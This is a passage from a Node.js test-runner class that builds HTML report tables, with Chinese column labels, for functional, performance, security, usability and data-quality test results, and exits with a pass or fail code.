        Object.entries(functional).forEach(([module, results]) => {
            if (results.total) {
                const passRate = Math.round((results.passed / results.total) * 100);
                const status = passRate >= 95 ? 'passed' : 'failed';
                html += `
                    <tr>
                        <td>${module}</td>
                        <td>${results.total}</td>
                        <td>${results.passed}</td>
                        <td>${results.failed}</td>
                        <td>${passRate}%</td>
                        <td><span class="status ${status}">${passRate >= 95 ? '✅' : '❌'}</span></td>
                    </tr>
                `;
            }
        });

        html += '</table>';
        return html;
    }

    renderPerformanceResults() {
        const performance = this.testResults.performance;
        let html = '<table><tr><th>性能指标</th><th>目标值</th><th>实际值</th><th>状态</th></tr>';

        if (performance.lighthouse) {
            html += `
                <tr>
                    <td>Lighthouse性能评分</td>
                    <td>≥90</td>
                    <td>${performance.lighthouse.performance}</td>
                    <td><span class="status ${performance.lighthouse.performance >= 90 ? 'passed' : 'failed'}">${performance.lighthouse.performance >= 90 ? '✅' : '❌'}</span></td>
                </tr>
            `;
        }

        if (performance.api && performance.api.length > 0) {
            const avgResponseTime = Math.round(performance.api.reduce((sum, item) => sum + item.average, 0) / performance.api.length);
            html += `
                <tr>
                    <td>平均API响应时间</td>
                    <td>≤200ms</td>
                    <td>${avgResponseTime}ms</td>
                    <td><span class="status ${avgResponseTime <= 200 ? 'passed' : 'failed'}">${avgResponseTime <= 200 ? '✅' : '❌'}</span></td>
                </tr>
            `;
        }

        html += '</table>';
        return html;
    }

    renderSecurityResults() {
        const security = this.testResults.security;
        let html = '<table><tr><th>安全检查</th><th>项目数量</th><th>通过率</th><th>状态</th></tr>';

        Object.entries(security).forEach(([category, results]) => {
            if (Array.isArray(results)) {
                const passed = results.filter(item => item.status === 'passed' || item.safe).length;
                const total = results.length;
                const passRate = Math.round((passed / total) * 100);
                html += `
                    <tr>
                        <td>${category}</td>
                        <td>${total}</td>
                        <td>${passRate}%</td>
                        <td><span class="status ${passRate === 100 ? 'passed' : 'warning'}">${passRate === 100 ? '✅' : '⚠️'}</span></td>
                    </tr>
                `;
            }
        });

        html += '</table>';
        return html;
    }

    renderUsabilityResults() {
        const usability = this.testResults.usability;
        let html = '<table><tr><th>用户体验检查</th><th>测试项目</th><th>通过数</th><th>状态</th></tr>';

        Object.entries(usability).forEach(([category, results]) => {
            if (Array.isArray(results)) {
                const passed = results.filter(item => item.success || item.found).length;
                const total = results.length;
                html += `
                    <tr>
                        <td>${category}</td>
                        <td>${total}</td>
                        <td>${passed}</td>
                        <td><span class="status ${passed === total ? 'passed' : 'failed'}">${passed === total ? '✅' : '❌'}</span></td>
                    </tr>
                `;
            }
        });

        html += '</table>';
        return html;
    }

    renderDataQualityResults() {
        const dataQuality = this.testResults.dataQuality;
        let html = '<table><tr><th>数据质量检查</th><th>测试项目</th><th>通过数</th><th>通过率</th><th>状态</th></tr>';

        Object.entries(dataQuality).forEach(([category, results]) => {
            if (Array.isArray(results)) {
                const passed = results.filter(item => item.accurate || item.realTime || item.integrity).length;
                const total = results.length;
                const passRate = total > 0 ? Math.round((passed / total) * 100) : 0;
                html += `
                    <tr>
                        <td>${category}</td>
                        <td>${total}</td>
                        <td>${passed}</td>
                        <td>${passRate}%</td>
                        <td><span class="status ${passRate >= 99 ? 'passed' : 'failed'}">${passRate >= 99 ? '✅' : '❌'}</span></td>
                    </tr>
                `;
            }
        });

        html += '</table>';
        return html;
    }
}

// 如果直接运行此脚本
if (require.main === module) {
    const runner = new WebUsabilityTestRunner();
    runner.runAllTests()
        .then(results => {
            console.log('\n🎉 测试执行完成！');
            console.log(`📊 总体评分: ${results.summary.overallScore}%`);
            console.log(`${results.summary.meetsStandard ? '✅' : '❌'} ${results.summary.meetsStandard ? '达到"完全可用"标准' : '未达到"完全可用"标准'}`);
            process.exit(results.summary.meetsStandard ? 0 : 1);
        })
        .catch(error => {
            console.error('❌ 测试执行失败:', error);
            process.exit(1);
        });
}

module.exports = WebUsabilityTestRunner;
